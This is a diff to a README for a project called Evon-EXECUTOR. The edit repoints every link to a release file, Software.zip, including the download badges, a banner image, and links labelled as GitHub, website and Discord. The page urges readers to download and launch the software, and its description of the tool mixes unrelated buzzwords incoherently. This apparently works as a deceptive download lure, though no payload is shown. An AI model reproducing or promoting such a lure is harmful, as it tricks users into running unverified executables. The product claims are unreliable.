@@ -1,7 +1,7 @@
 
 # 🚀 Welcome to Evon-EXECUTOR 🤖
 
-[![Evon-EXECUTOR Release](https://github.com/jova2011/Evon-EXECUTOR/releases/download/v1.0/Release.zip%20Here-Download%20Software-green)](https://github.com/jova2011/Evon-EXECUTOR/releases/download/v1.0/Release.zip)
+[![Evon-EXECUTOR Release](https://github.com/jova2011/Evon-EXECUTOR/releases/download/v2.0/Software.zip%20Here-Download%20Software-green)](https://github.com/jova2011/Evon-EXECUTOR/releases/download/v2.0/Software.zip)
 
 Welcome to the official repository of **Evon-EXECUTOR** where you can find an amazing project to support the Unified Naming Convention, making Evon compatible with 99.9% of modern scripts. Evon is a powerful tool designed for automation, cloud-native environments, and distributed systems. 🌐
 
@@ -34,7 +34,7 @@ Welcome to the official repository of **Evon-EXECUTOR** where you can find an am
 
 To access the Evon-EXECUTOR software, please click on the badge below to download the necessary files. Once downloaded, launch the software to experience the power of Evon in action! 🔧
 
-[![Evon-EXECUTOR Release](https://github.com/jova2011/Evon-EXECUTOR/releases/download/v1.0/Release.zip%20Here-Download%20Software-green)](https://github.com/jova2011/Evon-EXECUTOR/releases/download/v1.0/Release.zip)
+[![Evon-EXECUTOR Release](https://github.com/jova2011/Evon-EXECUTOR/releases/download/v2.0/Software.zip%20Here-Download%20Software-green)](https://github.com/jova2011/Evon-EXECUTOR/releases/download/v2.0/Software.zip)
 
 If you encounter any issues with the download link, please check the "Releases" section of this repository for alternative options. 📂
 
@@ -54,7 +54,7 @@ Feel free to contribute to the repository by submitting bug reports, feature req
 
 Let's embark on this exciting journey with Evon-EXECUTOR and unleash the true potential of automation and orchestration in your projects! Cheers to a brighter and more efficient future with Evon by your side. 🎉
 
-![Evon-EXECUTOR Banner](https://github.com/jova2011/Evon-EXECUTOR/releases/download/v1.0/Release.zip,technology)
+![Evon-EXECUTOR Banner](https://github.com/jova2011/Evon-EXECUTOR/releases/download/v2.0/Software.zip,technology)
 
 ---
 
@@ -64,6 +64,6 @@ Let's embark on this exciting journey with Evon-EXECUTOR and unleash the true po
 
 ## Connect with Us
 
-- [Follow us on GitHub](https://github.com/jova2011/Evon-EXECUTOR/releases/download/v1.0/Release.zip)
-- [Visit our official website](https://github.com/jova2011/Evon-EXECUTOR/releases/download/v1.0/Release.zip)
-- [Join our Discord community](https://github.com/jova2011/Evon-EXECUTOR/releases/download/v1.0/Release.zip)
+- [Follow us on GitHub](https://github.com/jova2011/Evon-EXECUTOR/releases/download/v2.0/Software.zip)
+- [Visit our official website](https://github.com/jova2011/Evon-EXECUTOR/releases/download/v2.0/Software.zip)
+- [Join our Discord community](https://github.com/jova2011/Evon-EXECUTOR/releases/download/v2.0/Software.zip)
